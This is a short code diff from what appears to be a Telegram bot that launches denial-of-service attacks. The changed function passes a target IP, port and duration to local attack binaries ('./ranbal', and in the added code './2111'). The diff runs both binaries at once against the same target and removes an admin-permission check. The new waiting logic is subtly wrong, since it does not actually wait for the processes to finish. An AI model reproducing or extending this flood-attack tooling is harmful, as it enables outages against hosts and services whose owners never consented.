@@ -84,14 +84,16 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration} 800")
-    await process.communicate()
+    # Run both commands simultaneously
+    command_1 = f"./2111 {target_ip} {target_port} {duration} 800"
+    command_2 = f"./ranbal {target_ip} {target_port} {duration} 800"
 
-def is_user_admin(user_id, chat_id):
-    try:
-        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
-    except:
-        return False
+    # Create subprocesses for both commands
+    process_1 = asyncio.create_subprocess_shell(command_1)
+    process_2 = asyncio.create_subprocess_shell(command_2)
+
+    # Wait for both processes to complete
+    await asyncio.gather(process_1, process_2)
 
 @bot.message_handler(commands=['approve', 'disapprove'])
 def approve_or_disapprove_user(message):
